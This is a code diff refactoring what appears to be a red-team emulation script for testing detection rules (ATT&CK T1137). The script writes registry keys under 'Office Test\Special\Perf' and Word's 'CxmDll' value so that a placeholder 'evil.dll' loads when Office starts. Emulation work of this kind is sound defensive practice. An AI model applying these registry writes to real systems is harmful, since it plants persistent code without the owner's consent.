@@ -8,9 +8,12 @@
 # ATT&CK: T1137
 # Description: Modifies the registry to persist a DLL on Office Startup.
 
-import sys
 
-from . import _common, RuleMetadata, register_code_rta, OSType
+import logging
+
+from . import OSType, _common, _const, register_code_rta
+
+log = logging.getLogger(__name__)
 
 
 @register_code_rta(
@@ -21,11 +24,12 @@ from . import _common, RuleMetadata, register_code_rta, OSType
     siem_rules=[],
     techniques=[],
 )
-def main(dll_location="c:\\windows\\temp\\evil.dll"):
+def main():
+    dll_location = "c:\\windows\\temp\\evil.dll"
     # Write evil dll to office test path:
     subkey = "Software\\Microsoft\\Office Test\\Special\\Perf"
-    _common.write_reg(_common.HKCU, subkey, "", dll_location)
-    _common.write_reg(_common.HKLM, subkey, "", dll_location)
+    _common.write_to_registry(_const.REG_HKCU, subkey, "", dll_location)
+    _common.write_to_registry(_const.REG_HKLM, subkey, "", dll_location)
 
     # winreg = _common.get_winreg()
     # set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "", dll_location, winreg.REG_SZ, 3)
@@ -33,8 +37,6 @@ def main(dll_location="c:\\windows\\temp\\evil.dll"):
 
     # Turn on Office 2010 WWLIBcxm persistence
     subkey = "Software\\Microsoft\\Office\\14.0\\Word"
-    _common.write_reg(_common.HKCU, subkey, "CxmDll", 1, _common.DWORD)
+    _common.write_to_registry(_const.REG_HKCU, subkey, "CxmDll", 1, _const.DWORD)
 
     # set_sleep_clear_key(winreg.HKEY_CURRENT_USER, subkey, "CxmDll", 1, winreg.REG_DWORD, 0)
-
-    return _common.SUCCESS
